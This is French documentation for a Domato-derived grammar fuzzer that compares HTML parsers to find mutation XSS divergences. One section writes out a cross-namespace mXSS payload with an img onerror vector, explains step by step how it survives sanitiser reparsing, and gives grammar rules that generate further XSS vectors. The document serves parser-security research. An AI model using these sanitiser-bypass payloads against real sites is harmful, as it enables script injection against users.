# domuto — syntaxe des grammaires et usage

Ce document décrit le format des fichiers de `rules/` et l'usage des deux scripts. Pour ce qu'est
le projet et ce qu'il faut installer, voir `README.md`.

Le moteur de grammaire vient de [Domato](https://github.com/googleprojectzero/domato) (Ivan
Fratric, Google, Apache 2.0). Il en a été réduit : la génération de JavaScript, les templates HTML
et les fonctions Python embarquées ont été retirées. Ce document décrit le moteur **tel qu'il est
ici**, pas tel qu'il est dans Domato.

---

## Arborescence

```
domuto/
├── generator.py        # point d'entrée — charge les grammaires, lance la comparaison
├── grammar.py          # moteur de grammaire (analyseur + générateur)
├── diff_compare.py     # comparateur différentiel Firefox / PHP DOM / Lexbor 2.7.0
├── analyze_findings.py # rejoue les divergences enregistrées, avec le détail des arbres
├── requirements.txt
├── findings/           # divergences trouvées (non versionné)
├── generated_files/    # HTML généré si --write-html (non versionné)
└── rules/
    ├── html.txt            # grammaire HTML principale, adaptée au contexte mXSS
    ├── html.txt.original   # grammaire HTML de Domato, conservée comme référence
    ├── mxss.md             # grammaire mXSS complète
    ├── mxss-vocab.md       # vocabulaire partagé, inclus par tous les profils
    ├── mxss-afe.md         # profil : adoption agency, éléments de formatage actifs
    ├── mxss-foreign.md     # profil : confusion de namespace HTML/MathML/SVG
    ├── mxss-foster.md      # profil : foster parenting
    ├── mxss-rawtext.md     # profil : sortie de RAWTEXT/RCDATA
    ├── mxss-encoding.md    # profil : entités, encodage, commentaires, CDATA
    ├── mxss-all.md         # composition de tous les profils
    ├── mxss-findings.md    # corpus de régression, PoC figés
    ├── common.txt, css.txt, cssproperties.txt
    ├── attributevalues.txt, tagattributes.txt
    ├── svg.txt, svgattrvalues.txt
    └── mathml.txt, mathmlattrvalues.txt
```

## Lancement

```bash
# 100 comparaisons avec la grammaire HTML complète
.venv/bin/python generator.py

# Grammaire mXSS ciblée, 5000 tirages
.venv/bin/python generator.py --grammar mxss.md --number 5000

# Profil isolé — chaque mxss-*.md est lançable seul
.venv/bin/python generator.py --grammar mxss-foster.md --number 1000

# Base enrichie d'un overlay
.venv/bin/python generator.py --grammar mxss.md --overlay mxss-rawtext.md

# Conserver tous les HTML générés, divergence ou non
.venv/bin/python generator.py --write-html True --number 20
```

| Option | Défaut | Rôle |
|---|---|---|
| `-g`, `--grammar` | `html.txt` | Fichier de grammaire, relatif à `rules/` |
| `-o`, `--overlay` | aucun | Grammaire supplémentaire chargée dans le même objet `Grammar` après la base |
| `-n`, `--number` | `100` | Nombre d'échantillons comparés |
| `-w`, `--write-html` | `False` | Écrire chaque HTML généré dans `generated_files/` |
| `-s`, `--sample-per-run` | `20` | Nombre d'expansions de la racine concaténées dans un même document |

Les divergences sont écrites dans `findings/`. Pour les rejouer avec le détail des trois arbres :

```bash
.venv/bin/python analyze_findings.py
```

### Overlays

Un overlay est une grammaire ordinaire chargée dans le **même** objet `Grammar` que la base. Le
moteur ajoute les productions au symbole existant (`grammar.py`, `_creators[...].append`) et
renormalise les probabilités à chaque analyse : l'overlay **étend** `<mxss_payload>` et les
symboles partagés au lieu de les écraser.

Une seule contrainte : l'overlay ne doit pas déclarer de règle `root=true`, la racine appartenant
à la base.

---

## Syntaxe des grammaires

### Règle de base

```
<symbole> = texte littéral avec <autresymbole> imbriqué
```

Chaque ligne définit une production. Plusieurs lignes pour le même symbole valent alternatives,
tirées au hasard, à distribution uniforme par défaut. Une règle ne peut pas tenir sur plusieurs
lignes.

### Commentaires

Tout ce qui suit le premier `#` de la ligne est un commentaire.

### Contrôle des probabilités

```
<symbol p=0.7> = alternative fréquente
<symbol p=0.2> = alternative rare
<symbol>       = le reste, soit 0.1
```

Si la somme dépasse 1, les probabilités sont renormalisées.

### Types intégrés

| Symbole | Produit | Attributs |
|---|---|---|
| `<int>`, `<int8>`, `<uint8>`, `<int16>`, `<uint16>`, `<int32>`, `<uint32>`, `<int64>`, `<uint64>` | un entier, en texte | `min=`, `max=` |
| `<float>`, `<double>` | un flottant | `min=`, `max=` (0 et 1 par défaut) |
| `<char>` | un caractère | `code=`, ou `min=`/`max=` sur le code |
| `<string>` | une chaîne aléatoire | `min=`/`max=` (bornes de code), `minlength=`/`maxlength=` |
| `<htmlsafestring>` | idem, métacaractères HTML échappés, guillemets compris | mêmes attributs |
| `<hex>` | un chiffre hexadécimal | `up` pour les majuscules |
| `<import from=… symbol=…>` | expansion depuis une grammaire importée | `symbol=` optionnel |

Les entiers sont toujours produits sous forme de texte : la sortie binaire de Domato (`b`, `be`)
n'existe plus ici.

### Constantes d'échappement

| Token | Caractère |
|---|---|
| `<lt>` | `<` |
| `<gt>` | `>` |
| `<hash>` | `#` |
| `<cr>` | retour chariot |
| `<lf>` | saut de ligne |
| `<space>` | espace |
| `<tab>` | tabulation |
| `<ex>` | `!` |

Elles sont indispensables partout où la sortie doit contenir un chevron littéral, y compris à
l'intérieur d'une valeur d'attribut : sans elles, `<` et `>` sont lus comme des délimiteurs de
symbole.

```
<HTMLDivElement> = <lt>div <div_attributes> <attributes><gt><innerelements><lt>/div<gt>
```

### Attributs de symbole

| Attribut | Effet |
|---|---|
| `root=true` | désigne la racine ; `generate_root()` part de là |
| `nonrecursive` | règle utilisable même à la profondeur maximale |
| `p=` | probabilité de l'alternative |
| `id=` | plusieurs symboles portant le même `id` partagent une valeur : seul le premier est expansé, les suivants le recopient |

### Directives

Trois directives seulement sont traitées :

```
!include fichier.md       # insère les règles dans la grammaire courante
!import fichier.txt       # crée une grammaire séparée, référencée par <import from=fichier.txt>
!max_recursion 50         # profondeur maximale (50 par défaut)
```

**Toute autre directive est ignorée en silence** (`grammar.py` : « unknown commands … are silently
skipped »). C'est le cas de `!varformat`, `!lineguard` et `!extends`, hérités de Domato : on peut
encore les écrire, elles ne font plus rien, la génération de code JavaScript qu'elles servaient
ayant été retirée.

### Récursion

Le moteur repère les règles récursives — le symbole de gauche réapparaît à droite. À l'approche de
`!max_recursion`, il bascule sur les règles marquées `nonrecursive` :

```
<innerelements nonrecursive=true p=0.5> = <htmlsafestring min=32 max=126>
<innerelements> = <newline><element><newline>
```

Sans règle non récursive pour un symbole atteint à la profondeur limite, une `RecursionError` est
levée, attrapée et signalée en avertissement.

### Import de grammaires externes

Deux mécanismes, qui diffèrent par le nom d'enregistrement.

```
!import css.txt
<mystyle> = style="<import from=css.txt symbol=property>"
```

La grammaire est enregistrée sous son nom de fichier. Depuis Python, on choisit le nom :

```python
cssgrammar = Grammar()
cssgrammar.parse_from_file('rules/css.txt')
htmlgrammar.add_import('cssgrammar', cssgrammar)
```

```
<mystyle> = style="<import from=cssgrammar symbol=property>"
```

C'est cette seconde forme qu'utilise `generator.py` pour charger `css.txt` quand la grammaire de
base est `html.txt`.

### Usage du moteur seul

```python
from grammar import Grammar

g = Grammar()
g.parse_from_file('rules/mxss.md')
print(g.generate_root())                    # depuis la racine
print(g.generate_symbol('mxss_payload'))    # depuis un symbole nommé
```

---

## Ajouter du vocabulaire

### Un nouvel élément

**1.** Définir la production dans `rules/html.txt` :

```
<HTMLMonElement> = <lt>monelement <monelement_attributes> <attributes><gt><innerelements><lt>/monelement<gt>
```

**2.** L'ajouter au sélecteur `<element>` :

```
<element> = <HTMLMonElement>
```

**3.** Définir ses attributs propres dans `rules/tagattributes.txt` :

```
<monelement_attribute> = <attribute_class>
<monelement_attribute> = <attribute_style>
<monelement_attributes> = <monelement_attribute> <monelement_attribute> <monelement_attribute> <monelement_attribute> <monelement_attribute>
```

La convention de la grammaire existante est que `<tagname_attributes>` produit exactement cinq
attributs.

Aucune déclaration de type DOM n'est nécessaire : le registre `_HTML_TYPES` de Domato servait à la
génération de JavaScript, qui n'existe plus ici.

### Un nouvel attribut

**1.** Déclarer ses valeurs dans `rules/attributevalues.txt` :

```
<monattribut_value> = valeur1
<monattribut_value> = <attributestring>
```

**2.** Déclarer l'attribut dans `rules/html.txt` :

```
<attribute_monattribut> = monattribut="<monattribut_value>"
```

**3.** L'ajouter au pool global, ou seulement à certains éléments dans `rules/tagattributes.txt` :

```
<attribute> = <attribute_monattribut>
<div_attribute> = <attribute_monattribut>
```

### Étendre un attribut existant

Les symboles d'`attributevalues.txt` s'augmentent par simple ajout de lignes :

```
<sandbox_value> = allow-downloads
```

---

## Imbrication

La récursion est le mécanisme qui produit les structures profondes. La hiérarchie native descend
par `<bodyelements>` → `<element>` → l'élément tiré → ses enfants, qui peuvent redescendre dans
`<element>`.

Pour un conteneur personnalisé :

```
<monconteneur_children> = <innerelements>
<monconteneur_children nonrecursive=true p=0.3> = <htmlsafestring min=32 max=126>
<monconteneur_children> = <newline><HTMLSpecialChild><newline>

<HTMLMonConteneur> = <lt>monconteneur <monconteneur_attributes> <attributes><gt><monconteneur_children><lt>/monconteneur<gt>
```

L'imbrication entre namespaces est native : `<element>` peut produire `<svgelement_svg>` ou
`<mathmlelement_math>`, et un `<foreignObject>` à l'intérieur du SVG ramène au HTML. C'est le
terrain des mutations par confusion de namespace :

```
<monconteneur_children> = <newline><svgelement_svg><newline>
<monconteneur_children> = <newline><mathmlelement_math><newline>
```

La profondeur se règle par `!max_recursion`. Plus haut donne des arbres plus profonds, une
génération plus lente, et un risque accru de `RecursionError`.

---

## Exemple complet — payload mXSS cross-namespace

### Le payload visé

```html
<form><math><mtext></form><form><mglyph><svg><mi><textarea><path is="</textarea><img src onerror=alert(origin)>">
```

### La technique

Mutation par confusion de namespaces, qui exploite les transitions du parseur entre HTML, MathML
et SVG :

1. `<form>` ouvre un formulaire en namespace HTML.
2. `<math>` fait basculer le parseur en MathML.
3. `<mtext>` est un point d'intégration : son contenu repasse au parseur HTML.
4. `</form>` ferme le formulaire extérieur depuis l'intérieur de `<mtext>`.
5. `<form>` en ouvre un second, toujours dans `<mtext>`.
6. `<mglyph>` force un retour en HTML intégré.
7. `<svg>` bascule en namespace SVG.
8. `<mi>` y est interprété comme MathML — comportement où les implémentations divergent.
9. `<textarea>` en contexte SVG est traité comme raw text : son contenu est consommé verbatim
   jusqu'à `</textarea>`.
10. `<path is="</textarea>…">` place la fermeture de textarea dans une valeur d'attribut.

L'effet se produit quand un assainisseur sérialise puis réanalyse : la structure change entre les
deux passes, et le `<img>` avec son gestionnaire `onerror` survit.

### La grammaire minimale correspondante

```
# Valeur de l'attribut is : ferme la textarea puis injecte le vecteur.
<is_mxss_value> = <lt>/textarea<gt><lt>img src onerror=alert(origin)<gt>

<payload root=true> = <lt>form<gt><lt>math<gt><lt>mtext<gt><lt>/form<gt><lt>form<gt><lt>mglyph<gt><lt>svg<gt><lt>mi<gt><lt>textarea<gt><lt>path is="<is_mxss_value>"<gt>
```

Aucun échappement HTML n'est appliqué à la valeur d'attribut : les chevrons produits par `<lt>` et
`<gt>` passent tels quels.

### En faire une famille

```
<xss_vector> = <lt>img src onerror=alert(origin)<gt>
<xss_vector> = <lt>svg onload=alert(1)<gt>
<xss_vector> = <lt>details open ontoggle=alert(1)<gt>

<is_mxss_value> = <lt>/textarea<gt><xss_vector>

<payload root=true> = <lt>form<gt><lt>math<gt><lt>mtext<gt><lt>/form<gt><lt>form<gt><lt>mglyph<gt><lt>svg<gt><lt>mi<gt><lt>textarea<gt><lt>path is="<is_mxss_value>"<gt>
```

---

## Points notables

### Attributs neutralisés à la génération

`generator.py` (`_apply_diff_attrs`) vide les symboles `*_attributes` propres à chaque balise, ainsi
que `svgattrs_*`, `svgattrx_*`, `mathmlattrs_*`, `animateattr` et `setattr`, pour réduire le bruit
dans les comparaisons. `<attributes>`, `<attributestring>` et `<attributechar>` sont préservés :
c'est par eux que passent les payloads.

### `<attribute_id>` et `<attribute_action>` sont commentés

Dans `rules/html.txt`, les lignes `<attribute_id>` (l. 701) et `<attribute_action>` (l. 570) sont
désactivées. Pour `action`, le motif est l'isolement : une URL dans `action` provoquerait des
requêtes réseau réelles.

### Placeholders résiduels dans `html.txt`

La première des deux règles `<html root=true>` de `rules/html.txt` (l. 49) contient encore
`<cssfuzzer>`, `<jsfuzzer>` et `body onload=jsfuzzer()`. Ces placeholders étaient remplacés par
Domato ; ici les lignes de substitution sont commentées dans `generator.py`. Ils sortent donc tels
quels dans le document comparé, comme éléments inconnus.

### Comparaison limitée au couple (nom, namespace)

`diff_compare.py` compare les arbres sur `(localName, namespaceURI)` uniquement. Les attributs sont
collectés et affichés comme témoin dans le rapport de divergence, mais n'entrent pas dans la
décision. Les noms sont mis en minuscules : Lexbor 2.7.0 abaisse la casse des noms SVG
(`foreignobject` contre `foreignObject`), ce qui produirait sinon une divergence à chaque tirage.
